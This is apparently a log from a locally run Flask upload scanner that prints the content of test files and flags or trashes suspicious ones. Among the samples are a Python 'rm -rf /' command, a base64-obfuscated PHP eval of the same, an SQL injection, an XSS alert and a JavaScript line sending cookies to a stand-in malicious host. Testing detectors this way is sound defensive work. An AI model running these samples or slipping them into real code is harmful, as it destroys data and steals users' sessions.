2025-02-22 20:13:24,986 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:13:24,987 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:13:24,988 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:13:24,989 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:13:24,990 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:13:24,991 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:13:24,992 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:13:24,993 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:13:24,998 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:25,005 - Embedded object detected in uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:13:25,005 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:25,007 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:13:25,008 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:13:25,010 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:13:25,010 - [33mPress CTRL+C to quit[0m
2025-02-22 20:13:28,315 - 127.0.0.1 - - [22/Feb/2025 20:13:28] "GET / HTTP/1.1" 200 -
2025-02-22 20:13:33,966 - 127.0.0.1 - - [22/Feb/2025 20:13:33] "[32mGET /delete/1 HTTP/1.1[0m" 302 -
2025-02-22 20:13:33,974 - 127.0.0.1 - - [22/Feb/2025 20:13:33] "GET / HTTP/1.1" 200 -
2025-02-22 20:13:45,639 - Extracted content from uploads/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 20:13:45,639 - Malicious pattern detected in uploads/malicious.pptx
2025-02-22 20:13:45,640 - 127.0.0.1 - - [22/Feb/2025 20:13:45] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:13:45,648 - 127.0.0.1 - - [22/Feb/2025 20:13:45] "GET / HTTP/1.1" 200 -
2025-02-22 20:13:50,872 - Extracted content from uploads/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 20:13:50,872 - Malicious pattern detected in uploads/malicious.xlsx
2025-02-22 20:13:50,873 - 127.0.0.1 - - [22/Feb/2025 20:13:50] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:13:50,879 - 127.0.0.1 - - [22/Feb/2025 20:13:50] "GET / HTTP/1.1" 200 -
2025-02-22 20:13:55,446 - Extracted content from uploads/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:13:55,451 - 127.0.0.1 - - [22/Feb/2025 20:13:55] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:13:55,456 - 127.0.0.1 - - [22/Feb/2025 20:13:55] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:00,433 - Extracted content from uploads/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:14:00,438 - 127.0.0.1 - - [22/Feb/2025 20:14:00] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:14:00,444 - 127.0.0.1 - - [22/Feb/2025 20:14:00] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:06,060 - 127.0.0.1 - - [22/Feb/2025 20:14:06] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:14:06,066 - 127.0.0.1 - - [22/Feb/2025 20:14:06] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:17,371 - Extracted content from uploads/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:14:17,371 - Malicious pattern detected in uploads/1.sql
2025-02-22 20:14:17,372 - 127.0.0.1 - - [22/Feb/2025 20:14:17] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:14:17,378 - 127.0.0.1 - - [22/Feb/2025 20:14:17] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:22,984 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:14:22,987 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:14:22,989 - Extracted content from uploads/test/test/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:14:22,990 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 20:14:22,990 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:14:22,991 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:14:22,993 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:14:22,994 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:14:22,996 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:14:23,000 - 127.0.0.1 - - [22/Feb/2025 20:14:23] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:14:23,005 - 127.0.0.1 - - [22/Feb/2025 20:14:23] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:28,392 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:14:28,392 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:14:28,392 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:14:28,397 - 127.0.0.1 - - [22/Feb/2025 20:14:28] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:14:28,403 - 127.0.0.1 - - [22/Feb/2025 20:14:28] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:33,548 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:14:33,548 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:14:33,548 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:14:33,553 - 127.0.0.1 - - [22/Feb/2025 20:14:33] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:14:33,559 - 127.0.0.1 - - [22/Feb/2025 20:14:33] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:37,309 - 127.0.0.1 - - [22/Feb/2025 20:14:37] "[32mGET /delete/96 HTTP/1.1[0m" 302 -
2025-02-22 20:14:37,315 - 127.0.0.1 - - [22/Feb/2025 20:14:37] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:37,772 - 127.0.0.1 - - [22/Feb/2025 20:14:37] "[32mGET /delete/40 HTTP/1.1[0m" 302 -
2025-02-22 20:14:37,779 - 127.0.0.1 - - [22/Feb/2025 20:14:37] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:38,130 - 127.0.0.1 - - [22/Feb/2025 20:14:38] "[32mGET /delete/41 HTTP/1.1[0m" 302 -
2025-02-22 20:14:38,136 - 127.0.0.1 - - [22/Feb/2025 20:14:38] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:41,414 - 127.0.0.1 - - [22/Feb/2025 20:14:41] "[32mGET /delete/42 HTTP/1.1[0m" 302 -
2025-02-22 20:14:41,421 - 127.0.0.1 - - [22/Feb/2025 20:14:41] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:42,782 - 127.0.0.1 - - [22/Feb/2025 20:14:42] "[32mGET /delete/39 HTTP/1.1[0m" 302 -
2025-02-22 20:14:42,791 - 127.0.0.1 - - [22/Feb/2025 20:14:42] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:44,859 - 127.0.0.1 - - [22/Feb/2025 20:14:44] "[32mGET /delete/43 HTTP/1.1[0m" 302 -
2025-02-22 20:14:44,864 - 127.0.0.1 - - [22/Feb/2025 20:14:44] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:45,335 - 127.0.0.1 - - [22/Feb/2025 20:14:45] "[32mGET /delete/44 HTTP/1.1[0m" 302 -
2025-02-22 20:14:45,341 - 127.0.0.1 - - [22/Feb/2025 20:14:45] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:45,719 - 127.0.0.1 - - [22/Feb/2025 20:14:45] "[32mGET /delete/45 HTTP/1.1[0m" 302 -
2025-02-22 20:14:45,725 - 127.0.0.1 - - [22/Feb/2025 20:14:45] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:46,091 - 127.0.0.1 - - [22/Feb/2025 20:14:46] "[32mGET /delete/46 HTTP/1.1[0m" 302 -
2025-02-22 20:14:46,098 - 127.0.0.1 - - [22/Feb/2025 20:14:46] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:46,464 - 127.0.0.1 - - [22/Feb/2025 20:14:46] "[32mGET /delete/47 HTTP/1.1[0m" 302 -
2025-02-22 20:14:46,471 - 127.0.0.1 - - [22/Feb/2025 20:14:46] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:46,827 - 127.0.0.1 - - [22/Feb/2025 20:14:46] "[32mGET /delete/48 HTTP/1.1[0m" 302 -
2025-02-22 20:14:46,832 - 127.0.0.1 - - [22/Feb/2025 20:14:46] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:49,242 - 127.0.0.1 - - [22/Feb/2025 20:14:49] "[32mGET /delete/49 HTTP/1.1[0m" 302 -
2025-02-22 20:14:49,248 - 127.0.0.1 - - [22/Feb/2025 20:14:49] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:50,388 - 127.0.0.1 - - [22/Feb/2025 20:14:50] "[32mGET /delete/50 HTTP/1.1[0m" 302 -
2025-02-22 20:14:50,394 - 127.0.0.1 - - [22/Feb/2025 20:14:50] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:52,571 - 127.0.0.1 - - [22/Feb/2025 20:14:52] "[32mGET /delete/51 HTTP/1.1[0m" 302 -
2025-02-22 20:14:52,579 - 127.0.0.1 - - [22/Feb/2025 20:14:52] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:53,512 - 127.0.0.1 - - [22/Feb/2025 20:14:53] "[32mGET /delete/52 HTTP/1.1[0m" 302 -
2025-02-22 20:14:53,519 - 127.0.0.1 - - [22/Feb/2025 20:14:53] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:54,604 - 127.0.0.1 - - [22/Feb/2025 20:14:54] "[32mGET /delete/53 HTTP/1.1[0m" 302 -
2025-02-22 20:14:54,609 - 127.0.0.1 - - [22/Feb/2025 20:14:54] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:55,047 - 127.0.0.1 - - [22/Feb/2025 20:14:55] "[32mGET /delete/54 HTTP/1.1[0m" 302 -
2025-02-22 20:14:55,054 - 127.0.0.1 - - [22/Feb/2025 20:14:55] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:55,466 - 127.0.0.1 - - [22/Feb/2025 20:14:55] "[32mGET /delete/55 HTTP/1.1[0m" 302 -
2025-02-22 20:14:55,472 - 127.0.0.1 - - [22/Feb/2025 20:14:55] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:55,863 - 127.0.0.1 - - [22/Feb/2025 20:14:55] "[32mGET /delete/56 HTTP/1.1[0m" 302 -
2025-02-22 20:14:55,872 - 127.0.0.1 - - [22/Feb/2025 20:14:55] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:56,235 - 127.0.0.1 - - [22/Feb/2025 20:14:56] "[32mGET /delete/57 HTTP/1.1[0m" 302 -
2025-02-22 20:14:56,241 - 127.0.0.1 - - [22/Feb/2025 20:14:56] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:56,646 - 127.0.0.1 - - [22/Feb/2025 20:14:56] "[32mGET /delete/58 HTTP/1.1[0m" 302 -
2025-02-22 20:14:56,655 - 127.0.0.1 - - [22/Feb/2025 20:14:56] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:57,812 - 127.0.0.1 - - [22/Feb/2025 20:14:57] "[32mGET /delete/59 HTTP/1.1[0m" 302 -
2025-02-22 20:14:57,824 - 127.0.0.1 - - [22/Feb/2025 20:14:57] "GET / HTTP/1.1" 200 -
2025-02-22 20:14:59,272 - 127.0.0.1 - - [22/Feb/2025 20:14:59] "[32mGET /delete/60 HTTP/1.1[0m" 302 -
2025-02-22 20:14:59,277 - 127.0.0.1 - - [22/Feb/2025 20:14:59] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:00,215 - 127.0.0.1 - - [22/Feb/2025 20:15:00] "[32mGET /delete/61 HTTP/1.1[0m" 302 -
2025-02-22 20:15:00,221 - 127.0.0.1 - - [22/Feb/2025 20:15:00] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:01,091 - 127.0.0.1 - - [22/Feb/2025 20:15:01] "[32mGET /delete/62 HTTP/1.1[0m" 302 -
2025-02-22 20:15:01,097 - 127.0.0.1 - - [22/Feb/2025 20:15:01] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:02,193 - 127.0.0.1 - - [22/Feb/2025 20:15:02] "[32mGET /delete/63 HTTP/1.1[0m" 302 -
2025-02-22 20:15:02,199 - 127.0.0.1 - - [22/Feb/2025 20:15:02] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:02,803 - 127.0.0.1 - - [22/Feb/2025 20:15:02] "[32mGET /delete/64 HTTP/1.1[0m" 302 -
2025-02-22 20:15:02,808 - 127.0.0.1 - - [22/Feb/2025 20:15:02] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:03,203 - 127.0.0.1 - - [22/Feb/2025 20:15:03] "[32mGET /delete/65 HTTP/1.1[0m" 302 -
2025-02-22 20:15:03,208 - 127.0.0.1 - - [22/Feb/2025 20:15:03] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:03,574 - 127.0.0.1 - - [22/Feb/2025 20:15:03] "[32mGET /delete/66 HTTP/1.1[0m" 302 -
2025-02-22 20:15:03,581 - 127.0.0.1 - - [22/Feb/2025 20:15:03] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:03,977 - 127.0.0.1 - - [22/Feb/2025 20:15:03] "[32mGET /delete/67 HTTP/1.1[0m" 302 -
2025-02-22 20:15:03,982 - 127.0.0.1 - - [22/Feb/2025 20:15:03] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:04,361 - 127.0.0.1 - - [22/Feb/2025 20:15:04] "[32mGET /delete/68 HTTP/1.1[0m" 302 -
2025-02-22 20:15:04,372 - 127.0.0.1 - - [22/Feb/2025 20:15:04] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:05,470 - 127.0.0.1 - - [22/Feb/2025 20:15:05] "[32mGET /delete/69 HTTP/1.1[0m" 302 -
2025-02-22 20:15:05,475 - 127.0.0.1 - - [22/Feb/2025 20:15:05] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:06,597 - 127.0.0.1 - - [22/Feb/2025 20:15:06] "[32mGET /delete/70 HTTP/1.1[0m" 302 -
2025-02-22 20:15:06,602 - 127.0.0.1 - - [22/Feb/2025 20:15:06] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:07,560 - 127.0.0.1 - - [22/Feb/2025 20:15:07] "[32mGET /delete/71 HTTP/1.1[0m" 302 -
2025-02-22 20:15:07,566 - 127.0.0.1 - - [22/Feb/2025 20:15:07] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:08,495 - 127.0.0.1 - - [22/Feb/2025 20:15:08] "[32mGET /delete/72 HTTP/1.1[0m" 302 -
2025-02-22 20:15:08,500 - 127.0.0.1 - - [22/Feb/2025 20:15:08] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:10,147 - 127.0.0.1 - - [22/Feb/2025 20:15:10] "[32mGET /delete/73 HTTP/1.1[0m" 302 -
2025-02-22 20:15:10,154 - 127.0.0.1 - - [22/Feb/2025 20:15:10] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:10,552 - 127.0.0.1 - - [22/Feb/2025 20:15:10] "[32mGET /delete/74 HTTP/1.1[0m" 302 -
2025-02-22 20:15:10,558 - 127.0.0.1 - - [22/Feb/2025 20:15:10] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:10,944 - 127.0.0.1 - - [22/Feb/2025 20:15:10] "[32mGET /delete/75 HTTP/1.1[0m" 302 -
2025-02-22 20:15:10,953 - 127.0.0.1 - - [22/Feb/2025 20:15:10] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:11,342 - 127.0.0.1 - - [22/Feb/2025 20:15:11] "[32mGET /delete/76 HTTP/1.1[0m" 302 -
2025-02-22 20:15:11,348 - 127.0.0.1 - - [22/Feb/2025 20:15:11] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:11,747 - 127.0.0.1 - - [22/Feb/2025 20:15:11] "[32mGET /delete/77 HTTP/1.1[0m" 302 -
2025-02-22 20:15:11,754 - 127.0.0.1 - - [22/Feb/2025 20:15:11] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:12,151 - 127.0.0.1 - - [22/Feb/2025 20:15:12] "[32mGET /delete/78 HTTP/1.1[0m" 302 -
2025-02-22 20:15:12,156 - 127.0.0.1 - - [22/Feb/2025 20:15:12] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:13,791 - 127.0.0.1 - - [22/Feb/2025 20:15:13] "[32mGET /delete/79 HTTP/1.1[0m" 302 -
2025-02-22 20:15:13,797 - 127.0.0.1 - - [22/Feb/2025 20:15:13] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:15,348 - 127.0.0.1 - - [22/Feb/2025 20:15:15] "[32mGET /delete/80 HTTP/1.1[0m" 302 -
2025-02-22 20:15:15,354 - 127.0.0.1 - - [22/Feb/2025 20:15:15] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:17,207 - 127.0.0.1 - - [22/Feb/2025 20:15:17] "[32mGET /delete/81 HTTP/1.1[0m" 302 -
2025-02-22 20:15:17,212 - 127.0.0.1 - - [22/Feb/2025 20:15:17] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:20,523 - 127.0.0.1 - - [22/Feb/2025 20:15:20] "[32mGET /delete/84 HTTP/1.1[0m" 302 -
2025-02-22 20:15:20,527 - 127.0.0.1 - - [22/Feb/2025 20:15:20] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:22,616 - 127.0.0.1 - - [22/Feb/2025 20:15:22] "[32mGET /delete/83 HTTP/1.1[0m" 302 -
2025-02-22 20:15:22,621 - 127.0.0.1 - - [22/Feb/2025 20:15:22] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:25,156 - 127.0.0.1 - - [22/Feb/2025 20:15:25] "[32mGET /delete/95 HTTP/1.1[0m" 302 -
2025-02-22 20:15:25,161 - 127.0.0.1 - - [22/Feb/2025 20:15:25] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:27,371 - 127.0.0.1 - - [22/Feb/2025 20:15:27] "[32mGET /delete/94 HTTP/1.1[0m" 302 -
2025-02-22 20:15:27,376 - 127.0.0.1 - - [22/Feb/2025 20:15:27] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:28,575 - 127.0.0.1 - - [22/Feb/2025 20:15:28] "[32mGET /delete/93 HTTP/1.1[0m" 302 -
2025-02-22 20:15:28,581 - 127.0.0.1 - - [22/Feb/2025 20:15:28] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:29,471 - 127.0.0.1 - - [22/Feb/2025 20:15:29] "[32mGET /delete/92 HTTP/1.1[0m" 302 -
2025-02-22 20:15:29,476 - 127.0.0.1 - - [22/Feb/2025 20:15:29] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:30,365 - 127.0.0.1 - - [22/Feb/2025 20:15:30] "[32mGET /delete/91 HTTP/1.1[0m" 302 -
2025-02-22 20:15:30,370 - 127.0.0.1 - - [22/Feb/2025 20:15:30] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:31,228 - 127.0.0.1 - - [22/Feb/2025 20:15:31] "[32mGET /delete/90 HTTP/1.1[0m" 302 -
2025-02-22 20:15:31,233 - 127.0.0.1 - - [22/Feb/2025 20:15:31] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:32,069 - 127.0.0.1 - - [22/Feb/2025 20:15:32] "[32mGET /delete/89 HTTP/1.1[0m" 302 -
2025-02-22 20:15:32,074 - 127.0.0.1 - - [22/Feb/2025 20:15:32] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:32,859 - 127.0.0.1 - - [22/Feb/2025 20:15:32] "[32mGET /delete/88 HTTP/1.1[0m" 302 -
2025-02-22 20:15:32,865 - 127.0.0.1 - - [22/Feb/2025 20:15:32] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:33,665 - 127.0.0.1 - - [22/Feb/2025 20:15:33] "[32mGET /delete/87 HTTP/1.1[0m" 302 -
2025-02-22 20:15:33,671 - 127.0.0.1 - - [22/Feb/2025 20:15:33] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:35,002 - 127.0.0.1 - - [22/Feb/2025 20:15:35] "[32mGET /delete/86 HTTP/1.1[0m" 302 -
2025-02-22 20:15:35,008 - 127.0.0.1 - - [22/Feb/2025 20:15:35] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:35,901 - 127.0.0.1 - - [22/Feb/2025 20:15:35] "[32mGET /delete/85 HTTP/1.1[0m" 302 -
2025-02-22 20:15:35,907 - 127.0.0.1 - - [22/Feb/2025 20:15:35] "GET / HTTP/1.1" 200 -
2025-02-22 20:15:44,943 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:15:44,943 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:15:44,943 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:15:44,948 - 127.0.0.1 - - [22/Feb/2025 20:15:44] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:15:44,953 - 127.0.0.1 - - [22/Feb/2025 20:15:44] "GET / HTTP/1.1" 200 -
2025-02-22 20:19:31,050 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:19:31,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:19:31,052 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:19:31,052 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:19:31,052 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:19:31,052 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:19:31,052 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

